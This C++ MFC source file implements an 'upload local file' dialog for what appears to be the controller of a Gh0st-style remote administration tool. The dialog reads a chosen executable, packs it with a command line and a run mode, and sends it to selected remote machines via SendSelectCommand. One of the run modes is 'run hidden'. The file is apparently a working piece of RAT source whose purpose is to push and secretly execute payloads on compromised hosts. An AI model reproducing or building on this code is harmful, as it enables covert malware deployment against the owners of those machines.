// LocalUpload.cpp : implementation file
//

#include "stdafx.h"
#include "Quick.h"
#include "QuickView.h"
#include "LocalUpload.h"



#ifdef _DEBUG
#define new DEBUG_NEW
#endif



/////////////////////////////////////////////////////////////////////////////
// CLocalUpload dialog


CLocalUpload::CLocalUpload(CWnd* pParent /*=NULL*/)
	: CDialog(CLocalUpload::IDD, pParent)
{
	//{{AFX_DATA_INIT(CLocalUpload)
	m_edit_path = _T("");
	m_edit_cmd_line = _T("");
	//}}AFX_DATA_INIT
}


void CLocalUpload::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CLocalUpload)
	DDX_Control(pDX, IDC_COMBO_TYPE, m_combo_type);
	DDX_Text(pDX, IDC_EDIT_LOCAL_PATH, m_edit_path);
	DDX_Text(pDX, IDC_EDIT_CMD_LINE, m_edit_cmd_line);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CLocalUpload, CDialog)
	//{{AFX_MSG_MAP(CLocalUpload)
	ON_BN_CLICKED(IDC_BUTTON_PATH, OnButtonPath)
	ON_CBN_SELCHANGE(IDC_COMBO_TYPE, OnSelchangeComboType)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CLocalUpload message handlers

BOOL CLocalUpload::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO: Add extra initialization here
	OnButtonPath();

	m_combo_type.InsertString(0, _T("正常运行"));
	m_combo_type.InsertString(1, _T("隐藏运行"));
	m_combo_type.InsertString(2, _T("不 运 行"));
	m_combo_type.SetCurSel(0);

	m_type = 0;

	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

void CLocalUpload::Setview(CQuickView* pCQuickView)
{
	g_pCQuickView = pCQuickView;
}

void CLocalUpload::OnButtonPath()
{
	// TODO: Add your control notification handler code here
	CFileDialog dlg(FALSE, NULL, NULL, OFN_HIDEREADONLY, _T("All Files (*.*)|*.*||"), this);
	if (dlg.DoModal() != IDOK)
		return;
	SetDlgItemText(IDC_EDIT_LOCAL_PATH, dlg.GetPathName());
}

typedef struct
{
	BYTE bToken;
	UINT nType;
	TCHAR lpCmdLine[MAX_PATH];
	TCHAR lpFileName[100];
}LOCALUP;


void CLocalUpload::OnOK()
{
	// TODO: Add extra validation here
	UpdateData(TRUE);

	if (m_edit_path == "")
	{
		AfxMessageBox(_T("请选择要上传的文件"));
		return;
	}

	CStringA m_edit_pathA;
	m_edit_pathA = m_edit_path;
	FILE* file;
	fopen_s(&file, m_edit_pathA, "rb");
	if (file == NULL)
	{
		AfxMessageBox(_T("文件读取失败！"));
		return;
	}
	// 读取文件
	unsigned char* data = NULL;
	size_t size;
	fseek(file, 0, SEEK_END);
	size = ftell(file);
	data = (unsigned char*)malloc(size);
	fseek(file, 0, SEEK_SET);
	fread(data, 1, size, file);
	fclose(file);


	int nPos = m_edit_path.ReverseFind(_T('\\'));
	m_edit_path = m_edit_path.Right(m_edit_path.GetLength() - nPos - 1);

	LOCALUP LocaUp;
	ZeroMemory(&LocaUp, sizeof(LOCALUP));

	LocaUp.bToken = COMMAND_UPLOAD_EXE;
	LocaUp.nType = m_type;
	lstrcpy(LocaUp.lpCmdLine, m_edit_cmd_line);
	lstrcpy(LocaUp.lpFileName, m_edit_path.GetBuffer(0));

	int	nPacketLength = sizeof(LOCALUP) + size;
	LPBYTE	lpPacket = new BYTE[nPacketLength];

	memcpy(lpPacket, &LocaUp, sizeof(LOCALUP));
	memcpy(lpPacket + sizeof(LOCALUP), data, size);

	g_pCQuickView->SendSelectCommand(lpPacket, nPacketLength);

	if (data)
		free(data);

	if (lpPacket)
		delete[] lpPacket;

	AfxMessageBox(_T("指令发送成功，传输文件过大时，请耐心等候！"));

	CDialog::OnOK();
}

void CLocalUpload::OnSelchangeComboType()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	m_type = m_combo_type.GetCurSel();

	switch (m_type)
	{
	case 0:
	case 1:
		GetDlgItem(IDC_EDIT_CMD_LINE)->EnableWindow(TRUE);
		break;
	case 2:
	case 3:
		GetDlgItem(IDC_EDIT_CMD_LINE)->EnableWindow(FALSE);
		SetDlgItemText(IDC_EDIT_CMD_LINE, _T(""));
		break;
	default:
		break;
	}
}
